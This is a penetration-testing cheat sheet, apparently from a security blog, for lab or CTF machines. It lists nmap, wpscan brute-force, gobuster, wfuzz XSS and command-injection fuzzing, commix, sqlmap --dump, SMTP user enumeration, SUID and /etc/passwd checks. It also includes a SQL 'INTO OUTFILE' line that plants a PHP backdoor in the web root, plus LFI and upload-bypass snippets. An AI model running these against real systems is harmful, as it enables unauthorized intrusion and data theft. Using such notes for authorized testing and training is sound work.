
### S1REN's Common
### FROM: https://sirensecurity.io/blog/common/


### Export The URL and IP:
export IP=ip_ of_machine
export URL=URL_of_the_machine

export IP=10.129.42.249 && export URL=http://$IP && export URLFUZZ=$URL/FUZZ && echo $IP && echo $URL && echo $URLFUZZ

### Create the machine/room file structure
mkdir vulns files nmap ProjDisc && touch hashes passwords users 

### Nmap
nmap -p- -sT -sV -A $IP
nmap -p- -sC -sV $IP --open
nmap -p- --script=vuln $IP

nmap -p- -sC -sV --webxml -oA nmap/InitialScan_AllPorts $IP --open

###HTTP-Methods
nmap --script http-methods --script-args http-methods.url-path='/website' 

###  --script smb-enum-shares
sed IPs:
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE


### WPScan & SSL
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u

### WPScan Brute Forceing:
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt

#### Cewl:
cewl $URL -m 5 -w $PWD/cewl.txt 2>/dev/null

### Aggressive Plugin Detection:
wpscan --url $URL --enumerate p --plugins-detection aggressive


### Nikto with SSL and Evasion
nikto --host $IP -ssl -evasion 1
SEE EVASION MODALITIES.


### dns_recon
dnsrecon –d yourdomain.com


### gobuster directory
gobuster dir -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -l -k -t 30

### gobuster files
gobuster dir -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt -l -k -t 30

### gobuster for SubDomain brute forcing:
gobuster dns -d domain.org -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
"just make sure any DNS name you find resolves to an in-scope address before you test it"


### Extract IPs from a text file.
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt


### Wfuzz XSS Fuzzing
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/XSS/XSS-BruteLogic.txt "$URL"
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/XSS/XSS-Jhaddix.txt "$URL"

### COMMAND INJECTION WITH POST DATA
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"

### Test for Paramter Existence!
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt "$URL"

### AUTHENTICATED FUZZING DIRECTORIES:
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "SESSIONID=value" "$URL"

### AUTHENTICATED FILE FUZZING:
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d "SESSIONID=value" "$URL"

### FUZZ Directories:
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URLFUZZ"

### FUZZ FILES:
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URLFUZZ"
|
LARGE WORDS:
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 "$URL"
|
USERS:
wfuzz -c -z file,/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt --hc 404,403 "$URL"



### Command Injection with commix, ssl, waf, random agent.
`commix --url="https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --random-agent`


### SQLMap
```
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
/SecLists/Fuzzing/alphanum-case.txt
```


### Social Recon
`theharvester -d domain.org -l 500 -b google`


### Nmap HTTP-methods
`nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'`


### SMTP USER ENUM
```
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t $IP
```


### Command Execution Verification - [Ping check]
`tcpdump -i any -c5 icmp`

### Check Network
`netdiscover /r 0.0.0.0/24`

### INTO OUTFILE D00R
`SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;`

LFI?
### PHP Filter Checks.
`php://filter/convert.base64-encode/resource=`

### UPLOAD IMAGE?
`GIF89a1`



### Find all the SUIDs and GUIDs:
SUIDs:
`find / -perm -u=s -type f 2>/dev/null`

GUIDs:
`find / -perm -g=s -type f 2>/dev/null`


### Get who is a user (from /etc/passwd):
`cat /etc/passwd | grep -iE '/sh|/bash|/zsh'`


### Setup ap python 


### MYSql Statements:
Show the databases:
show databases;

Change to a DB:
use <database>;
use wordpressdb;

To show the tables within a DB:
show tables;

To select information from a table:
select * from wp_users;


